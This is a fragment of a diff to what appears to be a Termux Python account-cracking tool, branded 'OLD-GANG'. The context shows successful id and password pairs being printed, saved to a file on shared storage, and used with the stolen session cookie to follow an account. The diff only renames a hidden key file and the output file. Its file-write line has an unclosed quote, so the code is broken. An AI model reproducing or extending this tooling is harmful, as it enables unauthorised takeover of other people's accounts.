@@ -88,9 +88,9 @@ imt="-Setu4786=="
 ak="Lover-"
 myid=uuid.uuid4().hex[:10].upper()
 try:
-	key1 = open('/data/data/com.termux/files/usr/bin/.Akash-cov', 'r').read()
+	key1 = open('/data/data/com.termux/files/usr/bin/.Old-cov', 'r').read()
 except:
-	kok=open('/data/data/com.termux/files/usr/bin/.Akash-cov', 'w')
+	kok=open('/data/data/com.termux/files/usr/bin/.Old-cov', 'w')
 	kok.write(myid+imt)
 	kok.close()
 def login():
@@ -371,7 +371,7 @@ def free(idf,pwv):
 				print(f'\r\x1b[1;92m [OLD-GANG_100%] {idf} * {pw}')
 				wrt =('%s - %s' % (idf,pw))
 				ok.append(wrt)
-				open('/sdcard/OLD-GANG_100%,'a').write('%s\n' % wrt)
+				open('/sdcard/OLD-GANG,'a').write('%s\n' % wrt)
 				follow(ses,coki)
 				break
  
